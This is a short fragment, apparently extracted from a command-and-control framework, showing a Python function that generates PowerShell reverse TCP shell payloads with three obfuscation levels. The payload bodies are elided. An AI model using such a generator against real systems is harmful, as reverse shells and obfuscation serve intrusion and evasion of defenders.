# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\_0xsojalsec_gunnerc2.py\core.py\payload_generator.py\windows.py\tcp.py\ps1.py\powershell_reverse_tcp_53d9959587bb.py
# NOTE: extracted with static-only rules; review before use

# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\windows\tcp\ps1\powershell_reverse_tcp.py
...
def generate_powershell_reverse_tcp(ip: str, port: int, obs: int, no_child: bool = False) -> str:
    """
    ...
    if obs == 1:
        payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port)
    ...
    if obs == 2:
        payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port)
    ...
    if obs == 3:
        payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port)
